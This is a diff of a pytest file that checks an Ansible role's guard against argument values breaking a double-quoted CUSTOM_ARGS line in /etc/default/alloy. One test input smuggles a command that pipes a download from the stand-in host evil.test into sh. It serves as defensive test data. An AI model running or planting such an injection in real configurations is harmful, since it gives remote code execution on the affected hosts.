@@ -1,20 +1,7 @@
 """The alloy_host guard on `alloy_host_extra_args`.
 
-The role writes one managed line into /etc/default/alloy:
-
-    CUSTOM_ARGS="--disable-reporting <joined extra args>"
-
-The joined args land INSIDE a double-quoted shell assignment, so an entry
-carrying a `"` closes it early and turns the remainder of the line into further
-shell words — silently changing what the unit runs, with no error anywhere.
-The role's `assert` is what stops that, and it is exactly the kind of guard a
-refactor drops without failing anything: the molecule scenario never answers
-`alloy_host_extra_args` with a hostile value, so the assert is skipped on an
-empty loop and its removal is invisible.
-
-These tests read the condition out of the role and evaluate it, so removing the
-assert, widening its condition, or losing the loop over the variable all fail
-here — no molecule run required.
+The joined args land inside a double-quoted shell assignment; the role's assert
+is read out and evaluated here, since molecule never answers a hostile value.
 """
 
 from __future__ import annotations
@@ -24,12 +11,13 @@ from pathlib import Path
 import jinja2
 import pytest
 import yaml
+from _helpers import ansible_env
 
 REPO = Path(__file__).resolve().parent.parent
 ROLE = REPO / "ansible_collections" / "weisssrv" / "infra" / "roles" / "alloy_host"
 MAIN = ROLE / "tasks" / "main.yml"
 
-QUOTE_ASSERT = "Assert no Alloy extra argument contains a double quote"
+QUOTE_ASSERT = "Assert no Alloy extra argument breaks the CUSTOM_ARGS assignment"
 CUSTOM_ARGS = "Set Alloy command-line arguments"
 
 TASKS = [t for t in yaml.safe_load(MAIN.read_text()) if isinstance(t, dict)]
@@ -48,17 +36,16 @@ def _conditions() -> list[str]:
 
 def _accepts(arg: str) -> bool:
     """Evaluate the role's real assert condition against one loop item."""
-    env = jinja2.Environment(undefined=jinja2.StrictUndefined)
-    env.filters["bool"] = bool
+    env = ansible_env(undefined=jinja2.StrictUndefined)
     expression = " and ".join(f"({c})" for c in _conditions())
     return env.from_string("{{ (" + expression + ") | bool }}").render(item=arg) == "True"
 
 
-def test_the_guard_exists_with_the_exact_condition() -> None:
-    """Pinned literally: `'\"' not in item` is the whole guard, and a rewrite
+def test_the_guard_exists_with_the_exact_conditions() -> None:
+    """Pinned literally: these two clauses are the whole guard, and a rewrite
     into something looser (`is not search`, a `| quote`) would still read as a
     quoting check while admitting the value that breaks the assignment."""
-    assert _conditions() == ["'\"' not in item"]
+    assert _conditions() == ["'\"' not in item", 'not item.endswith("\\\\")']
 
 
 def test_the_guard_covers_every_entry_of_the_variable() -> None:
@@ -109,21 +96,15 @@ def test_ordinary_arguments_are_accepted(arg: str) -> None:
         '--x=a" ; curl http://evil.test/x | sh ; echo "',
         'trailing"',
         '"leading',
+        "--x=trailing\\",
     ],
 )
-def test_an_embedded_double_quote_is_rejected(arg: str) -> None:
-    """Each closes the CUSTOM_ARGS assignment early, so the value systemd hands
-    ExecStart is a truncated one and whatever follows becomes further words —
-    the unit runs something nobody wrote, and nothing reports an error."""
+def test_values_that_break_the_assignment_are_rejected(arg: str) -> None:
+    """Values that close the CUSTOM_ARGS assignment early are rejected."""
     assert _accepts(arg) is False
 
 
 @pytest.mark.parametrize("arg", ["--x=$(id)", "--x=`id`", "--x=a b", "--x='q'"])
 def test_the_guard_is_scoped_to_the_double_quote_it_names(arg: str) -> None:
-    """Deliberately NOT a general shell-safety check. /etc/default/alloy is read
-    by systemd as an EnvironmentFile, which parses quoting itself and never runs
-    a shell — so `$(…)`/backticks are inert bytes there, while a `"` really does
-    terminate the value. Pinning the scope keeps a later reviewer from reading
-    this assert as broader protection than it gives, and stops it being widened
-    into a filter that rejects legitimate arguments."""
+    """The guard covers the double quote and trailing backslash only, not shell metacharacters."""
     assert _accepts(arg) is True
